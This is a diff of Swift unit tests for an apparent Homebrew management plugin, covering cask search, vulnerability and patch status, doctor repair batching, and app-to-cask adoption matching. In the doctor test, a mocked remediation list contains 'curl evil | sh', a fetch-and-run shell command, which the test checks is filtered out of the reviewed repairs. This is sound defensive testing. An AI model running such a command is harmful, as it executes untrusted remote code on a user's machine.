@@ -74,6 +74,7 @@ extension HomebrewManagementReadTests {
         let management = HomebrewManagementReads(targets: targets, applications: { [app] })
         let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
             if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
+            if args == ["search", "--cask", "--", "/(example)/"] { return HomebrewReadOutput(status: 0, stdout: Data("example\n".utf8)) }
             if args.first == "ruby" { XCTAssertTrue(args.contains("--adopt")); return .init(status: 0, stdout: Data("==> Would install 1 cask:\nexample\n".utf8)) }
             XCTAssertEqual(args, ["info", "--json=v2", "--cask", "--", "example"])
             return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[],"casks":[{"token":"example","version":"2.0","installed":null,"artifacts":[{"app":["Example.app"]}]}]}"#.utf8))
@@ -153,8 +154,9 @@ extension HomebrewManagementReadTests {
         let management = HomebrewManagementReads(transport: network)
         let profile = HomebrewReadProfile(executable: { prefix.appendingPathComponent("bin/brew") }, execute: { _, args, _, _ in
             if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
-            XCTAssertEqual(args, ["list", "--formula", "--versions"])
-            return HomebrewReadOutput(status: 0, stdout: Data("example 1.0\n".utf8))
+            if args == ["list", "--formula", "--versions"] { return HomebrewReadOutput(status: 0, stdout: Data("example 1.0\n".utf8)) }
+            XCTAssertEqual(args, ["info", "--json=v2", "--formula", "--", "example"])
+            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"example","versions":{"stable":"2.0"},"revision":0,"patches":[],"outdated":true,"pinned":false}]}"#.utf8))
         }, management: management)
         let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("vulnerabilities")]), owner: PluginID("management"))
         XCTAssertEqual(result.value(atPointer: "/checked"), .number(1))
@@ -307,5 +309,76 @@ extension HomebrewManagementReadTests {
             XCTAssertEqual(validator.errors(for: value).isEmpty, valid, file)
             if definition == "input" { XCTAssertEqual((try? HomebrewReadInput(value)) != nil, valid, file) }
         }
+    }
+}
+
+extension HomebrewManagementReadTests {
+    func testDoctorFixAllFreezesOnlyReviewedRepairsAndExpiresWithReport() throws {
+        let targets = HomebrewManagementTargets()
+        let management = HomebrewManagementReads(targets: targets)
+        let owner = PluginID("management")
+        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
+            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
+            return HomebrewReadOutput(status: 1, stdout: Data(#"{"tier":2,"findings":[{"text":"Repairs","remediation":{"commands":["brew link wget","brew cleanup","curl evil | sh","brew link wget"]}}]}"#.utf8))
+        }, management: management)
+        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("doctor")])
+        let result = try profile.read(input, owner: owner)
+        guard case .string(let key)? = result.value(atPointer: "/fix_all/target") else { return XCTFail("Missing reviewed repair set") }
+        XCTAssertEqual(result.value(atPointer: "/fix_all/count"), .number(2))
+        let batch = try targets.resolve(target: key, owner: owner)
+        XCTAssertEqual(batch.metadata.value(atPointer: "/doctor_steps/0/input/operation"), .string("link"))
+        XCTAssertEqual(batch.metadata.value(atPointer: "/doctor_steps/1/input/operation"), .string("cleanup"))
+        XCTAssertNil(batch.metadata.value(atPointer: "/doctor_steps/2"))
+        _ = try profile.read(input, owner: owner)
+        XCTAssertFalse(targets.isCurrent(target: key, owner: owner))
+    }
+}
+
+extension HomebrewManagementReadTests {
+    func testVulnerabilitiesSeparateInstalledRecipePatchesFromOlderKegs() throws {
+        let prefix = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
+        defer { try? FileManager.default.removeItem(at: prefix) }
+        for version in ["1.0", "2.0_1"] {
+            let path = prefix.appendingPathComponent("Cellar/example/" + version + "/sbom.spdx.json")
+            try FileManager.default.createDirectory(at: path.deletingLastPathComponent(), withIntermediateDirectories: true)
+            try Data(#"{"packages":[{"SPDXID":"SPDXRef-Archive-example-src","downloadLocation":"https://github.com/example/project/archive/refs/tags/v1.0.tar.gz","versionInfo":"1.0"}]}"#.utf8).write(to: path)
+        }
+        let network = ManagementMetadataTransport { request in
+            if request.url.path == "/v1/querybatch" { return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"results":[{"vulns":[{"id":"GHSA-abcd-1234-5678"}]}]}"#.utf8)) }
+            return HTTPSTransportResponse(status: 200, headers: [:], body: Data(#"{"id":"GHSA-abcd-1234-5678","aliases":["CVE-2026-1234"],"summary":"Patched issue"}"#.utf8))
+        }
+        var installedVersion = "2.0_1"
+        let profile = HomebrewReadProfile(executable: { prefix.appendingPathComponent("bin/brew") }, execute: { _, args, _, _ in
+            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
+            if args == ["list", "--formula", "--versions"] { return HomebrewReadOutput(status: 0, stdout: Data("example \(installedVersion)\n".utf8)) }
+            XCTAssertEqual(args, ["info", "--json=v2", "--formula", "--", "example"])
+            return HomebrewReadOutput(status: 0, stdout: Data(#"{"formulae":[{"name":"example","versions":{"stable":"2.0"},"revision":1,"outdated":true,"pinned":false,"patches":[{"resolves":[{"type":"security","id":"CVE-2026-1234"}]}]}],"casks":[]}"#.utf8))
+        }, management: HomebrewManagementReads(transport: network))
+        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("vulnerabilities")])
+        let current = try profile.read(input, owner: PluginID("security"))
+        XCTAssertEqual(current.value(atPointer: "/findings/0/advisories/0/status"), .string("patched"))
+        XCTAssertEqual(current.value(atPointer: "/findings/0/patched_count"), .number(1))
+        installedVersion = "1.0"
+        let older = try profile.read(input, owner: PluginID("security"))
+        XCTAssertEqual(older.value(atPointer: "/findings/0/advisories/0/status"), .string("open"))
+        XCTAssertEqual(older.value(atPointer: "/findings/0/upgrade_available"), .bool(true))
+    }
+}
+
+extension HomebrewManagementReadTests {
+    func testAdoptionCandidatesAutomaticallyMatchBoundedCasksAndExposeConfidenceWithoutPaths() throws {
+        let apps = [HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Example.app"), name: "Example", bundleID: "org.example.app", version: "2.0", fingerprint: "current"), HomebrewAdoptionApplication(url: URL(fileURLWithPath: "/Applications/Old.app"), name: "Old", bundleID: "org.old.app", version: "1.0", fingerprint: "old")]
+        let management = HomebrewManagementReads(targets: HomebrewManagementTargets(), applications: { apps })
+        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
+            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
+            if args.first == "search" { return HomebrewReadOutput(status: 0, stdout: Data("example\nold\n".utf8)) }
+            XCTAssertEqual(args, ["info", "--json=v2", "--cask", "--", "example", "old"])
+            return HomebrewReadOutput(status: 0, stdout: Data(#"{"casks":[{"token":"example","version":"2.0","installed":null,"artifacts":[{"app":["Example.app"]},{"uninstall":[{"quit":"org.example.app"}]}]},{"token":"old","version":"2.0","installed":null,"artifacts":[{"app":["Old.app"]}]}]}"#.utf8))
+        }, management: management)
+        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("adoptionCandidates")]), owner: PluginID("adoption"))
+        XCTAssertEqual(result.value(atPointer: "/applications/0/candidates/0/name"), .string("example"))
+        XCTAssertEqual(result.value(atPointer: "/applications/0/candidates/0/confidence"), .string("ready"))
+        XCTAssertEqual(result.value(atPointer: "/applications/1/candidates/0/confidence"), .string("cannot"))
+        XCTAssertNil(result.value(atPointer: "/applications/0/path"))
     }
 }
